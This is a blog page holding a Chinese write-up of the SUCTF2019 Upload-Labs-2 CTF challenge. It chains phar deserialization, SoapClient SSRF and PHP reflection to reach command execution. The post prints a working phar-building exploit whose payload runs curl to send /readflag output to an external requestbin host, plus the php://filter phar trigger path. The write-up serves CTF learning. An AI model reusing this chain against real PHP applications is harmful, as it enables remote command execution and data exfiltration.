@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="yemoli's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="题目界面 题目分析题目源码：https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202 buu中将admin.php中的Ad类的析构函数改成了下面的代码  命令执行的点也在这里，接着看admin.php中的代码  在这里我们需要进行ssrf才能使用此功能，同时为了到达命令执行的点我们需要通过check函数的检查 1">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2019-Upload-Labs-2复现分析">
+<meta property="og:url" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/index.html">
+<meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="题目界面 题目分析题目源码：https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202 buu中将admin.php中的Ad类的析构函数改成了下面的代码  命令执行的点也在这里，接着看admin.php中的代码  在这里我们需要进行ssrf才能使用此功能，同时为了到达命令执行的点我们需要通过check函数的检查 1">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/1.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/2.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/3.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/4.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/5.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/6.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/7.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/8.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/9.png">
+<meta property="og:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/10.png">
+<meta property="og:updated_time" content="2021-01-05T14:06:47.233Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SUCTF2019-Upload-Labs-2复现分析">
+<meta name="twitter:description" content="题目界面 题目分析题目源码：https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202 buu中将admin.php中的Ad类的析构函数改成了下面的代码  命令执行的点也在这里，接着看admin.php中的代码  在这里我们需要进行ssrf才能使用此功能，同时为了到达命令执行的点我们需要通过check函数的检查 1">
+<meta name="twitter:image" content="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/">
+
+
+
+
+
+  <title>SUCTF2019-Upload-Labs-2复现分析 | yemoli's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yemoli's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            friends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="夜莫离、">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yemoli's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SUCTF2019-Upload-Labs-2复现分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-05T21:00:31+08:00">
+                2021-01-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  560
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="题目界面"><a href="#题目界面" class="headerlink" title="题目界面"></a>题目界面</h2><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/1.png" alt="1"></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202</a></p>
+<p>buu中将admin.php中的Ad类的析构函数改成了下面的代码</p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/2.png" alt="2"></p>
+<p>命令执行的点也在这里，接着看admin.php中的代码</p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/3.png" alt="3"></p>
+<p>在这里我们需要进行ssrf才能使用此功能，同时为了到达命令执行的点我们需要通过check函数的检查</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line"><span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br></pre></td></tr></table></figure>
+<p>在这里通过反射来调用类中的方法，我们可以寻找一个存在单参数方法的原生类，这里用到了SplDoublyLinkedList::unshift，如图</p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/4.png" alt="4"></p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/5.png" alt="5"></p>
+<p>接着在func.php中存在着如下的代码</p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/6.png" alt="6"></p>
+<p>跟进getMIME</p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/7.png" alt="7"></p>
+<p>其中finfo_file可以触发phar反序列化</p>
+<p>为了绕过func.php中的正则，我们可以使用php伪协议绕过，同时在File类中存在着如下wakeup方法</p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/8.png" alt="8"></p>
+<p>在该方法中使用反射可以获取到任意类的实例，在这里自然想到soap反序列化，当执行到$a-&gt;check();时候会触发soap类中的__call方法，可以造成ssrf，参考如下文章：<a href="https://blog.csdn.net/qq_38154820/article/details/106330082" target="_blank" rel="noopener">https://blog.csdn.net/qq_38154820/article/details/106330082</a></p>
+<p>在这里可以构造如下生成phar的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	$target = <span class="string">'http://127.0.0.1/admin.php'</span>;</span><br><span class="line">		$post_string = <span class="string">'admin=1&amp;cmd=curl "http://http.requestbin.buuoj.cn/w7rkm9w7?a=`/readflag`"&amp;clazz=SplDoublyLinkedList&amp;func1=unshift&amp;func2=unshift&amp;func3=unshift&amp;arg1=1&amp;arg2=2&amp;arg3=3'</span>;</span><br><span class="line">		$headers = <span class="keyword">array</span>(</span><br><span class="line">    		<span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    		<span class="string">'Cookie: name=1234'</span></span><br><span class="line">    	);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">"SoapClient"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = [<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">"wupco\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>.join(<span class="string">"\r\n"</span>,$headers).<span class="string">"\r\nContent-Length: "</span>.(string)strlen($post_string).<span class="string">"\r\n\r\n"</span>.$post_string,<span class="string">'uri'</span>=&gt; <span class="string">"aaab"</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传后触发phar</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/resource=phar:/</span><span class="regexp">/upload/</span>f528764d624db129b32c21fbca0cb8d6<span class="regexp">/394659692a460258b45a99f1424ea357.jpg</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/9.png" alt="9"></p>
+<p>拿到flag</p>
+<p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/10.png" alt="10"></p>
+<p>参考链接：<a href="https://guokeya.github.io/post/-05AEB0Yn/" target="_blank" rel="noopener">https://guokeya.github.io/post/-05AEB0Yn/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/04/安洵杯2019-cssgame题目复现/" rel="next" title="安洵杯2019-cssgame题目复现">
+                <i class="fa fa-chevron-left"></i> 安洵杯2019-cssgame题目复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">夜莫离、</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">71</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yemoli" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chxing.xyz/" title="Bling_Dog" target="_blank">Bling_Dog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="Smi1e" target="_blank">Smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="Altman" target="_blank">Altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn/" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="赵" target="_blank">赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cdusec.com/" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top/" title="CDUSEC内部博客" target="_blank">CDUSEC内部博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jjhpkcr.xyz/" title="江江河畔砍柴人" target="_blank">江江河畔砍柴人</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.youknowi.xin/" title="图先生" target="_blank">图先生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura" target="_blank">a3ura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.recorday.cn/" title="C0d3r1iu" target="_blank">C0d3r1iu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.iloveflag.com/" title="醉梦半醒" target="_blank">醉梦半醒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目界面"><span class="nav-number">1.</span> <span class="nav-text">题目界面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">夜莫离、</span>
+
+  
+</div>
+
+
+  <!-- <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div> 
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>-->
+
+
+
+<div class="theme-info">
+ <div class="powered-by"></div>
+ <span class="post-count">博客全站共74.5k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
